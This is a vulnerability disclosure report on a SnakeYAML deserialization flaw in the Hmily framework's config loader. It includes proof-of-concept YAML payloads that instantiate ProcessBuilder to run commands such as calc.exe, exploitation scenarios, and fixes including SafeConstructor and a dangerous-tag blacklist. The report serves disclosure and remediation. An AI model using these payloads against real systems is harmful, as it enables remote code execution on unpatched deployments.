Hmily Framework Security Vulnerability Analysis Report
1. Product Introduction
1.1 Product Overview
Hmily is a financial-grade flexible distributed transaction solution, providing two transaction modes: TCC (Try-Confirm-Cancel) and TAC (Try-Auto-Confirm). It can be easily integrated into business systems with a zero-intrusion and rapid integration approach. In terms of performance, it adopts a decentralized design, completely integrates with the business system, and natively supports cluster deployment.
1.2 Core Features
● High Reliability: Supports transaction rollback in case of exceptions, timeout exception recovery, and prevents transaction suspension in distributed scenarios.
● Ease of Use: Provides zero-intrusive rapid integration for Spring-Boot and Spring-Namespace.
● High Performance: Decentralized design, completely integrated with the business system.
● Support for Multiple RPC Frameworks: Supports well-known RPC frameworks like Dubbo, SpringCloud, Motan, Sofa-rpc, brpc, and tars.
● Diverse Storage Options: Supports various storage methods such as MySQL, Oracle, MongoDB, Redis, and ZooKeeper.
Project Address:​ https://github.com/dromara/hmily
2. Vulnerability Description
2.1 SnakeYAML Deserialization Vulnerability
2.1.1 Vulnerability Basic Information
● Vulnerability Type:​ Deserialization vulnerability
● Affected Component:​ SnakeYAML 1.23
● CVSS Score:​ 9.8 (Critical)
2.1.2 Vulnerability Principle
The Constructor class in SnakeYAML version 1.x does not restrict the types that can be deserialized. Attackers can instantiate arbitrary Java classes through maliciously constructed YAML files. When the framework processes YAML configuration files, if an insecure Constructoris used instead of SafeConstructor, it may pose a risk of remote code execution (RCE).
2.2 Vulnerability Location
2.2.1 Core Vulnerable Code Location
File path: hmily-config/hmily-config-loader/src/main/java/org/dromara/hmily/config/loader/yaml/OriginTrackedYamlLoader.java
2.2.2 Key Vulnerable Function
@Override
protected Yaml createYaml(){
    BaseConstructor constructor = new OriginTrackingConstructor();
    Representer representer = new Representer();
    DumperOptions dumperOptions = new DumperOptions();
    LimitedResolver resolver = new LimitedResolver();
    LoaderOptions loaderOptions = new LoaderOptions();
    loaderOptions.setAllowDuplicateKeys(false);
    return new Yaml(constructor, representer, dumperOptions, loaderOptions, resolver);
}
2.3 Vulnerability Principle Analysis and Reproduction
2.3.1 Root Cause
● Use of an insecure Constructor:​ The code uses OriginTrackingConstructor, which inherits from the insecure Constructorclass.
● Lack of a type whitelist:​ There is no restriction on the classes that can be deserialized.
● Allows arbitrary type instantiation:​ Any Java class, including dangerous ones, can be instantiated.
2.3.2 Vulnerability Verification Steps
1. Arbitrary Type Instantiation Verification
// Construct malicious YAML content
String maliciousYaml = "!!java.lang.ProcessBuilder [calc.exe]";
Yaml yaml = new Yaml(new Constructor());
Object result = yaml.load(new StringReader(maliciousYaml));
2. Dangerous Class Access Verification
// Test Runtime class access
String runtimeYaml = "!!java.lang.Runtime";
Object runtimeObj = yaml.load(new StringReader(runtimeYaml));
// Test FileOutputStream class access
String fileYaml = "!!java.io.FileOutputStream [/tmp/test.txt]";
Object fileObj = yaml.load(new StringReader(fileYaml));
3. Command Execution Capability Verification
// Direct instantiation of ProcessBuilder
String pbYaml = "!!java.lang.ProcessBuilder [cmd, /c, echo Hello]";
ProcessBuilder pb = (ProcessBuilder) yaml.load(new StringReader(pbYaml));
2.3.3 Complete POC (Proof of Concept)
(Note: The provided POC code block is extensive. The following is a high-level summary. The full code is present in the original document.)
The POC demonstrates the vulnerability via a Java program named HmilySnakeYAMLPOC. It includes three test methods:
● testArbitraryInstantiation(): Tests instantiating ProcessBuilderto launch the calculator (calc.exe).
● testDangerousClassAccess(): Tests accessing dangerous classes like Runtimeand FileOutputStream.
● testCommandExecution(): Tests command execution capabilities.
2.3.4 Vulnerability Reproduction Steps
1. Environment Preparation:
    ○ Check Java version: java -version
    ○ Navigate to the directory containing the POC file.
2. Compile the POC program:
    ○ javac -encoding UTF-8 HmilySnakeYAMLPOC.java
3. Execute the vulnerability verification:
    ○ java HmilySnakeYAMLPOC
4. Observation and Verification of Results:
The expected output shows successful instantiation of dangerous classes and command execution (calculator launching). The program confirms the framework is at high security risk.

3. Vulnerability Impact Assessment
3.1 Security Risk
● Attack Difficulty:​ Low (Proof of Concept is complete)
● Affected Scope:​ All Hmily framework instances using the affected version
● Potential Consequences:​ Remote Code Execution (RCE), system privilege escalation
3.2 Exploitation Scenarios
1. Configuration File Injection: Execute arbitrary commands through malicious YAML configuration files.
2. Network Transmission Attack: Inject malicious objects through serialized data packets.
3. Internal System Attack: Execute malicious operations within a trusted internal network.
4. Fix Recommendations
4.1 Immediate Mitigation
Upgrade SnakeYAML to a secure version (1.32 or later):
<dependency>
    <groupId>org.yaml</groupId>
    <artifactId>snakeyaml</artifactId>
    <version>1.32</version>
</dependency>
4.2 Code-Level Fixes
Solution 1: Immediately replace Constructorwith SafeConstructor
// Modified file: OriginTrackedYamlLoader.java
@Override
protected Yaml createYaml() {
    // Emergency fix: Use SafeConstructor instead of OriginTrackingConstructor
    BaseConstructor constructor = new SafeConstructor(); // Key modification
    Representer representer = new Representer();
    DumperOptions dumperOptions = new DumperOptions();
    LimitedResolver resolver = new LimitedResolver();
    LoaderOptions loaderOptions = new LoaderOptions();
    loaderOptions.setAllowDuplicateKeys(false);
    return new Yaml(constructor, representer, dumperOptions, loaderOptions, resolver);
}
Solution 2: Input Content Security Filtering
// Add YAML content security check
private boolean isSafeYamlContent(String content) {
    if (content == null) return false;
    // Blacklist filtering for dangerous tags
    String[] dangerousTags = {"!!java.", "!!javax.", "!!sun."};
    for (String tag : dangerousTags) {
        if (content.contains(tag)) {
            logger.warn("Detected dangerous YAML tag: {}", tag);
            return false;
        }
    }
    return true;
}

